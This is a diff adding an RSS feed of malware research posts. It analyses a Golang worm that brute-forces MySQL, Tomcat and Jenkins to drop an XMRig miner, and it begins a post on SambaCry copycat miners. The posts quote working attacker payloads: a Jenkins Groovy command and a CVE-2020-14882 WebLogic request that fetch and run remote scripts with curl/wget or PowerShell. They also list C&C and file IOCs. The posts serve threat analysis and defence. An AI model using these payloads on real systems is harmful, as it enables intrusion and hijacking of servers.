@@ -1,0 +1,458 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Intezer Research – Cryptomining</title><link>https://intezer.github.io/community-intelligence/tags/cryptomining/</link><description>Recent content in Cryptomining on Intezer Research</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 29 Dec 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://intezer.github.io/community-intelligence/tags/cryptomining/index.xml" rel="self" type="application/rss+xml"/><item><title>Early Bird Catches the Worm: New Golang Worm Drops XMRig Miner on Servers</title><link>https://intezer.github.io/community-intelligence/blog/2020/12/new-golang-worm-drops-xmrig-miner-on-servers/</link><pubDate>Tue, 29 Dec 2020 00:00:00 +0000</pubDate><guid>https://intezer.github.io/community-intelligence/blog/2020/12/new-golang-worm-drops-xmrig-miner-on-servers/</guid><description>
+&lt;p&gt;In early December, we discovered a new, undetected worm written in Golang. This
+worm continues the popular
+&lt;a href="https://intezer.com/blog/cloud-security/top-linux-cloud-threats-of-2020/"target="_blank" rel="noopener"&gt;2020 trend&lt;/a&gt;
+of multi-platform malware developed in Golang.&lt;/p&gt;
+&lt;p&gt;The worm attempts to spread across the network in order to run XMRig Miner on a
+large scale. The malware targets both Windows and Linux servers and can easily
+maneuver from one platform to the other. It targets public facing services;
+MySQL, Tomcat admin panel and Jenkins that have weak passwords. In an older
+version, the worm has also attempted to exploit WebLogic’s latest
+vulnerability: CVE-2020-14882.&lt;/p&gt;
+&lt;p&gt;During our analysis, the attacker kept updating the worm on the Command and
+Control (C&amp;amp;C) server, indicating that it’s active and might be targeting
+additional weak configured services in future updates.&lt;/p&gt;
+&lt;h2&gt;Technical Analysis of New Golang Worm&lt;span class="hx:absolute hx:-mt-20" id="technical-analysis-of-new-golang-worm"&gt;&lt;/span&gt;
+&lt;a href="#technical-analysis-of-new-golang-worm" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The attack uses three files: a dropper script (bash or powershell), a Golang
+binary worm, and an XMRig Miner—all of which are hosted on the same C&amp;amp;C.&lt;/p&gt;
+&lt;p&gt;The ELF worm binary and the bash dropper script are both fully undetected in
+VirusTotal at the time of this publication. Figure 1 shows the ELF worm binary
+result in VirusTotal.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://intezer.github.io/community-intelligence/blog/2020/12/new-golang-worm-drops-xmrig-miner-on-servers/images/fig1.png" title="Figure 1: ELF file fully undetected in VirusTotal (ead2cf8ab7aef63706b40eb57d668d0a)" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Figure 1: ELF file fully undetected in VirusTotal (ead2cf8ab7aef63706b40eb57d668d0a)&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;The malware behaves similarly on both Linux and Windows operating systems. We
+will describe the Linux worm flow below.&lt;/p&gt;
+&lt;h3&gt;Linux Worm Attack Flow&lt;span class="hx:absolute hx:-mt-20" id="linux-worm-attack-flow"&gt;&lt;/span&gt;
+&lt;a href="#linux-worm-attack-flow" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Upon execution, the worm checks if a process on the infected machine is
+listening on port 52013. The existence of a listener on this port functions as
+a mutex for the malware. If a socket for the port is already open, the instance
+exits, otherwise it opens a network socket on the port.&lt;/p&gt;
+&lt;p&gt;In the older version, the worm will then unpack the XMRig Miner as Network01 to
+the tmp folder and run it. The miner is embedded within the Golang binary using
+a
+&lt;a href="https://go.libhunt.com/categories/538-resource-embedding"target="_blank" rel="noopener"&gt;Go resource embedding package&lt;/a&gt;
+called &lt;a href="https://github.com/go-bindata/go-bindata"target="_blank" rel="noopener"&gt;go-bindata&lt;/a&gt;. The bindataFile
+functions are used by the malware to unpack the embedded XMRig Miner binary.
+Figure 2 shows the function inside this file.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://intezer.github.io/community-intelligence/blog/2020/12/new-golang-worm-drops-xmrig-miner-on-servers/images/fig2.png" title="Figure 2: xmrig_linux_amd64.go file" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Figure 2: xmrig_linux_amd64.go file&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;The malware will scan the network using TCP SYN in order to find services it
+can brute force and spread over the network. It will scan for IPs that have
+open ports related to these services: 8080 for Tomcat and Jenkins, 3306 for
+MySQL and 7001 for WebLogic on older versions of the worm. Each of these
+exploits has a package under the src “exp” (exploit) code.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://intezer.github.io/community-intelligence/blog/2020/12/new-golang-worm-drops-xmrig-miner-on-servers/images/fig3.png" title="Figure 3: “exp” package files and functions" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Figure 3: “exp” package files and functions&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;The worm uses the &lt;a href="https://github.com/google/gopacket"target="_blank" rel="noopener"&gt;gopacket&lt;/a&gt; library that
+provides C bindings for Go to use libpcap to read network packets. By running
+pcapc, the worm gathers network data which is used to gather ACKS and continue
+to brute force the services. Figure 4 shows the worm’s output for brute force
+and exploitation attempts on Tomcat and MySQL services.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://intezer.github.io/community-intelligence/blog/2020/12/new-golang-worm-drops-xmrig-miner-on-servers/images/fig4.png" title="Figure 4: Snippet from worm output" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Figure 4: Snippet from worm output&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Post exploitation, the malware will deliver a loader script: ld.sh for Linux
+and ld.ps1 for Windows. The loader is responsible for dropping and running the
+XMRig Miner and the Golang worm on the exploited service. See loader scripts in
+Figures 5 and 6.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://intezer.github.io/community-intelligence/blog/2020/12/new-golang-worm-drops-xmrig-miner-on-servers/images/fig5.png" title="Figure 5: ldr.sh – Dropper bash script for Linux-based services" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Figure 5: ldr.sh – Dropper bash script for Linux-based services&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://intezer.github.io/community-intelligence/blog/2020/12/new-golang-worm-drops-xmrig-miner-on-servers/images/fig6.png" title="Figure 6: ldr.ps1 script – Dropper powershell script for Windows-based services" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Figure 6: ldr.ps1 script – Dropper powershell script for Windows-based services&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3&gt;Exploit Flow&lt;span class="hx:absolute hx:-mt-20" id="exploit-flow"&gt;&lt;/span&gt;
+&lt;a href="#exploit-flow" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The following describes the attack flow for each service.&lt;/p&gt;
+&lt;h4&gt;MySql: Port 3306&lt;span class="hx:absolute hx:-mt-20" id="mysql-port-3306"&gt;&lt;/span&gt;
+&lt;a href="#mysql-port-3306" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;The malware will run a credential spraying brute force attack. The malware uses
+a hardcoded dictionary of weak credentials, such as &lt;code&gt;root:123456&lt;/code&gt;, for this
+attack.&lt;/p&gt;
+&lt;p&gt;After a successful login, it will run a shellcode to gain a local privilege
+escalation using mysql UDF. The exploits are embedded within the binary as a
+hex string. The worm has an exploit for each operating system and architecture
+(UDFLINUX32, UDFLINUX64, UDFLWIN32 and UDFWIN64). Browse
+&lt;a href="https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf?rss"target="_blank" rel="noopener"&gt;here&lt;/a&gt;
+for more information about the exploit.&lt;/p&gt;
+&lt;p&gt;After running the exploit, the payload will use the sys_exec command to drop
+and run the loader script. URLWIN and URLLINUX store the dropper script URL.
+Figures 7 and 8 show the described payload for each operating system.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://intezer.github.io/community-intelligence/blog/2020/12/new-golang-worm-drops-xmrig-miner-on-servers/images/fig7.png" title="Figure 7: MySQL queries – Linux payload" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Figure 7: MySQL queries – Linux payload&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://intezer.github.io/community-intelligence/blog/2020/12/new-golang-worm-drops-xmrig-miner-on-servers/images/fig8.png" title="Figure 8: MySQL queries – Windows payload" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Figure 8: MySQL queries – Windows payload&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h4&gt;Tomcat: Port 8080&lt;span class="hx:absolute hx:-mt-20" id="tomcat-port-8080"&gt;&lt;/span&gt;
+&lt;a href="#tomcat-port-8080" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;The malware will run credential spraying on the admin panel using basic
+authentication.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://intezer.github.io/community-intelligence/blog/2020/12/new-golang-worm-drops-xmrig-miner-on-servers/images/fig9.png" title="Figure 9: Example of an authentication request to the Tomcat admin panel" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Figure 9: Example of an authentication request to the Tomcat admin panel&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Upon a successful trial, the malware will attempt to deploy a WAR file (Web
+Application Resource), which will be used to transfer the 1.jsp file containing
+the malicious payload.&lt;/p&gt;
+&lt;p&gt;The malware will send Get requests and will parse the parameters with the jsp
+file: &lt;code&gt;%s/1.jsp?win=%s&amp;amp;linux=%s&lt;/code&gt;. These parameters will contain the dropper
+script URL. The jsp script will then drop and run the loaders.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://intezer.github.io/community-intelligence/blog/2020/12/new-golang-worm-drops-xmrig-miner-on-servers/images/fig10.png" title="Figure 10: 1.jsp file script" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Figure 10: 1.jsp file script&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h4&gt;Jenkins: Port 8080&lt;span class="hx:absolute hx:-mt-20" id="jenkins-port-8080"&gt;&lt;/span&gt;
+&lt;a href="#jenkins-port-8080" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Similar to previous exploits, the malware will brute force Jenkins login with
+password spraying and run the following payload:&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;cmd@/c@powershell iex(New-Object Net.WebClient).DownloadString(‘%s’)!bash@-c@(curl -fsSL %s || wget -q -O – %s) | bash
+println “%s”&amp;#43;”%s”;def s=new String(Base64.getDecoder().decode(“%s”&amp;#43;”%s”.reverse())).split(“!”);def c=System.getProperty(“os.name”).contains(“indo”)?s[0].split(“@”):s[1].split(“@”);c.execute()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h4&gt;WebLogic: Port 7001&lt;span class="hx:absolute hx:-mt-20" id="weblogic-port-7001"&gt;&lt;/span&gt;
+&lt;a href="#weblogic-port-7001" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;In the older version, the malware uses the latest WebLogic remote code
+execution exploit CVE-2020-14882. It will send a get request to the WebLogic
+service, and use the GET request headers as part of the payload.&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;GET
+/console/css/%%25%%32%%65%%25%%32%%65%%25%%32%%66consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(‘weblogic.work.ExecuteThread
+%%20currentThread(weblogic.work.ExecuteThread)Thread.currentThread();weblogic.work.
+WorkAdapter%%20adapter=currentThread.getCurrentWork();java.lang.reflect.Field%%20
+field=adapter.getClass().getDeclaredField(“connectionHandler”);field.setAccessible
+(true);Object%%20obj=field.get(adapter);weblogic.servlet.internal.ServletRequestI
+mpl%%20req(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod
+(“getServletRequest”).invoke(obj);String%%20cmd=req.getHeader(“cmd”);String[]%%
+20cmds=System.getProperty(“os.name”).toLowerCase().contains(“win”)?new%%20String[]{“cmd.exe”,”/c”,req.getHeader(“win”)}:new%%20String[]{“/bin/sh”,”c”,req.getHeader
+(“linux”)};if(cmd!=null{String%%20result=new%%20java.util.Scanner(new%%20java.lang
+.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(“%%5C%%5CA”).next();
+weblogic.servlet.internal.ServletResponseImpl%%20res(weblogic.servlet.internal.
+ServletResponseImpl)req.getClass().getMethod(“getResponse”).invoke(req);work.
+getServletOutputStream().writeStream(new%%20weblogic.xml.util.StringInputStream
+(result));work.getServletOutputStream().flush
+();}currentThread.interrupt();’) HTTP/1.0
+Host: %s:%d
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:82.0) Gecko/20100101 Firefox/82.0
+Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Connection: close
+cmd: ls
+linux: ( (curl -fsSL %s || wget -q -O – %s) | bash&amp;amp; )
+win: start powershell iex(New-Object Net.WebClient).DownloadString(‘%s’)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h2&gt;How Do I Protect Myself?&lt;span class="hx:absolute hx:-mt-20" id="how-do-i-protect-myself"&gt;&lt;/span&gt;
+&lt;a href="#how-do-i-protect-myself" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Take the following precautions in order to avoid brute force attacks and
+vulnerability exploits:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Use complex passwords, limit login attempts and use 2FA (Two-Factor
+Authentication) if possible.&lt;/li&gt;
+&lt;li&gt;Minimize your use of publicly facing services.&lt;/li&gt;
+&lt;li&gt;Keep your software updated with the latest security patches.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Summary of Golang Malware&lt;span class="hx:absolute hx:-mt-20" id="summary-of-golang-malware"&gt;&lt;/span&gt;
+&lt;a href="#summary-of-golang-malware" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In 2020, we saw a noticeable trend of Golang malware targeting different
+platforms, including Windows, Linux, Mac and
+&lt;a href="https://intezer.com/blog/malware-analysis/now-supporting-genetic-malware-analysis-for-android-applications/"target="_blank" rel="noopener"&gt;Android&lt;/a&gt;.
+We assess with high confidence that this will continue in 2021.&lt;/p&gt;
+&lt;p&gt;The fact that the worm’s code is nearly identical for both its PE and ELF
+malware—and the ELF malware going undetected in VirusTotal—demonstrates that
+Linux threats are still flying under the radar for most security and detection
+platforms.&lt;/p&gt;
+&lt;p&gt;Both PE and ELF worms are now classified as XMRig Miner Dropper in
+&lt;a href="http://analyze.intezer.com/"target="_blank" rel="noopener"&gt;Intezer Analyze&lt;/a&gt;, which means you can detect and
+classify any variants that are genetically similar.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://intezer.github.io/community-intelligence/blog/2020/12/new-golang-worm-drops-xmrig-miner-on-servers/images/fig11.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Special thanks to Joakim Kennedy for his contribution to this research.&lt;/strong&gt;&lt;/p&gt;
+&lt;h2&gt;IOCs&lt;span class="hx:absolute hx:-mt-20" id="iocs"&gt;&lt;/span&gt;
+&lt;a href="#iocs" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;C&amp;amp;C&lt;span class="hx:absolute hx:-mt-20" id="cc"&gt;&lt;/span&gt;
+&lt;a href="#cc" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;185[.]239[.]242[.]71&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;Files&lt;span class="hx:absolute hx:-mt-20" id="files"&gt;&lt;/span&gt;
+&lt;a href="#files" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;h4&gt;Linux&lt;span class="hx:absolute hx:-mt-20" id="linux"&gt;&lt;/span&gt;
+&lt;a href="#linux" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h4&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Description&lt;/th&gt;
+&lt;th&gt;File name&lt;/th&gt;
+&lt;th&gt;File type&lt;/th&gt;
+&lt;th&gt;MD5&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Dropper script&lt;/td&gt;
+&lt;td&gt;ldr.sh&lt;/td&gt;
+&lt;td&gt;Bash script&lt;/td&gt;
+&lt;td&gt;236d7925cfafc1f643babdb8e48966bf&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Worm&lt;/td&gt;
+&lt;td&gt;sysrv&lt;/td&gt;
+&lt;td&gt;64bit ELF binary&lt;/td&gt;
+&lt;td&gt;UPX packed – ead2cf8ab7aef63706b40eb57d668d0a&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Worm&lt;/td&gt;
+&lt;td&gt;sysrv&lt;/td&gt;
+&lt;td&gt;64bit ELF binary&lt;/td&gt;
+&lt;td&gt;Unpacked – 750644690e51db9f695b542b463164b9&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Worm&lt;/td&gt;
+&lt;td&gt;sysrv&lt;/td&gt;
+&lt;td&gt;64bit ELF binary&lt;/td&gt;
+&lt;td&gt;UPX packed – f4c90b41126fc17848bd0d131288bd36&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Worm&lt;/td&gt;
+&lt;td&gt;sysrv&lt;/td&gt;
+&lt;td&gt;64bit ELF binary&lt;/td&gt;
+&lt;td&gt;Unpacked – D8499b7b2e2aeb76387668306e982673&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Worm&lt;/td&gt;
+&lt;td&gt;sysrv&lt;/td&gt;
+&lt;td&gt;64bit ELF binary&lt;/td&gt;
+&lt;td&gt;UPX packed – 301a0a58dd98ecbbe12c6acbd0c7bbdc&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Worm&lt;/td&gt;
+&lt;td&gt;sysrv&lt;/td&gt;
+&lt;td&gt;64bit ELF binary&lt;/td&gt;
+&lt;td&gt;Unpacked – f5859e81ff49dd66e501ec7c0f39c83e&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Miner&lt;/td&gt;
+&lt;td&gt;xmr32&lt;/td&gt;
+&lt;td&gt;32bit ELF binary&lt;/td&gt;
+&lt;td&gt;9c2aa65235a939b2811f281a45ecdab0&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Miner&lt;/td&gt;
+&lt;td&gt;xmr64&lt;/td&gt;
+&lt;td&gt;64bit ELF binary&lt;/td&gt;
+&lt;td&gt;078b2a96f45b493e82b44f8c5344e7e5&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h4&gt;Windows&lt;span class="hx:absolute hx:-mt-20" id="windows"&gt;&lt;/span&gt;
+&lt;a href="#windows" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h4&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Description&lt;/th&gt;
+&lt;th&gt;File name&lt;/th&gt;
+&lt;th&gt;File type&lt;/th&gt;
+&lt;th&gt;MD5&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Dropper script&lt;/td&gt;
+&lt;td&gt;ldr.ps1&lt;/td&gt;
+&lt;td&gt;PowerShell script&lt;/td&gt;
+&lt;td&gt;d708a5394e9448ab38201264df423c0a&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Worm&lt;/td&gt;
+&lt;td&gt;sysrv.exe&lt;/td&gt;
+&lt;td&gt;32bit PE binary&lt;/td&gt;
+&lt;td&gt;UPX packed – 030231d96234f06ae09ca18d621241e5&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Worm&lt;/td&gt;
+&lt;td&gt;sysrv.exe&lt;/td&gt;
+&lt;td&gt;32bit PE binary&lt;/td&gt;
+&lt;td&gt;Unpacked – 14f57bd246cc1db3131cab421fbc8dac&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Worm&lt;/td&gt;
+&lt;td&gt;sysrv.exe&lt;/td&gt;
+&lt;td&gt;32bit PE binary&lt;/td&gt;
+&lt;td&gt;UPX packed – 642d73c85e6e79720a5ae7b82fc427c5&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Worm&lt;/td&gt;
+&lt;td&gt;sysrv.exe&lt;/td&gt;
+&lt;td&gt;32bit PE binary&lt;/td&gt;
+&lt;td&gt;Unpacked – b1a4ec25e168156aeee8184b05777b1b&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Miner&lt;/td&gt;
+&lt;td&gt;xmr32.exe&lt;/td&gt;
+&lt;td&gt;32bit PE binary&lt;/td&gt;
+&lt;td&gt;97d89d25e9589f995d374cb7d89b4433&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Miner&lt;/td&gt;
+&lt;td&gt;xmr64.exe&lt;/td&gt;
+&lt;td&gt;64bit PE binary&lt;/td&gt;
+&lt;td&gt;569fcf95f3889cefd87c1b425fa37b03&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h4&gt;JSP&lt;span class="hx:absolute hx:-mt-20" id="jsp"&gt;&lt;/span&gt;
+&lt;a href="#jsp" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;644f20b5a6e03aa054ba62d32f983adc&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;</description></item><item><title>"EternalMiner" Copycats exploiting SambaCry for cryptocurrency mining</title><link>https://intezer.github.io/community-intelligence/blog/2017/07/eternalminer-copycats/</link><pubDate>Wed, 26 Jul 2017 00:00:00 +0000</pubDate><guid>https://intezer.github.io/community-intelligence/blog/2017/07/eternalminer-copycats/</guid><description>
+&lt;p&gt;About eight weeks ago, a critical RCE vulnerability present in every Samba
+version since 2010 was reported and patched. This vulnerability is mostly known
+as &amp;ldquo;SambaCry&amp;rdquo; after the famous WannaCry attack targeting Windows systems
+vulnerable to &amp;ldquo;EternalBlue&amp;rdquo; SMB exploit. The vulnerability lies in a logical
+bug, which enables an attacker with write-only access to a share to load a
+malicious samba module and execute arbitrary code.&lt;/p&gt;
+&lt;p&gt;Immediately after writing &amp;amp; publishing the first public
+&lt;a href="https://github.com/omri9741/cve-2017-7494"target="_blank" rel="noopener"&gt;POC code&lt;/a&gt;, I wrote a yara signature
+for a possible exploit payload and we began monitoring our data feeds for
+threats exploiting this vulnerability. Over time, we have noticed countless
+bind/reverse shells and droppers. Most of them are either Metasploit payload or
+other publicly available implants.&lt;/p&gt;
+&lt;p&gt;On June 9th, Kaspersky Labs published an article about
+&amp;ldquo;&lt;a href="https://securelist.com/sambacry-is-coming/78674/"target="_blank" rel="noopener"&gt;EternalMiner&lt;/a&gt;&amp;rdquo; — a
+financially driven cryptocurrency mining malware turning victim machines into
+&amp;ldquo;a workhouse on a large farm, mining crypto-currency for the attackers&amp;rdquo;.&lt;/p&gt;
+&lt;p&gt;Less than a week later, we were able to observe copycat cybercriminals actively
+exploiting the vulnerability with a similar yet improved setup for better
+cryptomining &amp;amp; control over the victim machines. Naturally, we decided to name
+this threat &amp;ldquo;&lt;strong&gt;CopyMiner&lt;/strong&gt;&amp;rdquo;!&lt;/p&gt;
+&lt;h2&gt;Overview&lt;span class="hx:absolute hx:-mt-20" id="overview"&gt;&lt;/span&gt;
+&lt;a href="#overview" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;As we mentioned above, the copycats used a similar yet improved setup.
+Implementing a multistage flexible approach with daily updates from multiple
+backup servers, a persistent backdoor for better control of the victim machines
+and even a more efficient
+&lt;a href="https://intezer.com/blog/research/a-rare-look-inside-a-cryptojacking-campaign-and-its-profit/"target="_blank" rel="noopener"&gt;cryptominer&lt;/a&gt;
+for better consumption of the victim machine’s resources! &lt;strong&gt;The copycats took
+EternalMiner to the next level as an operation suitable for multiple victim’s
+machines&lt;/strong&gt;. In the following sections, we will drill down on each component of
+the following graph, comparing CopyMiner’s setup vs EternalMiner:&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://intezer.github.io/community-intelligence/blog/2017/07/eternalminer-copycats/images/fig1.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
+&lt;h2&gt;Technical Analysis&lt;span class="hx:absolute hx:-mt-20" id="technical-analysis"&gt;&lt;/span&gt;
+&lt;a href="#technical-analysis" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;&amp;ldquo;CopyMiner&amp;rdquo; Dropper&lt;span class="hx:absolute hx:-mt-20" id="copyminer-dropper"&gt;&lt;/span&gt;
+&lt;a href="#copyminer-dropper" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;On the 14th of June a small unique dropper
+&lt;a href="https://www.virustotal.com/en/file/444d0fae73e1221b81dc6c5d53cf087afa88248fc22ef36e756841ab04df24a8/analysis/1497997544/"target="_blank" rel="noopener"&gt;sample&lt;/a&gt;
+was uploaded to VirusTotal. The dropper starts executing from
+&amp;ldquo;samba_init_module&amp;rdquo; exports then tries to fetch a payload from the server &amp;amp;
+execute it as root user in the background. This is done using a hard-coded
+obfuscated bash one-liner as you can see in the picture below.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://intezer.github.io/community-intelligence/blog/2017/07/eternalminer-copycats/images/fig2.png" title="sample hash: 444d0fae73e1221b81dc6c5d53cf087afa88248fc22ef36e756841ab04df24a8" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;sample hash: 444d0fae73e1221b81dc6c5d53cf087afa88248fc22ef36e756841ab04df24a8&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3&gt;Payload&lt;span class="hx:absolute hx:-mt-20" id="payload"&gt;&lt;/span&gt;
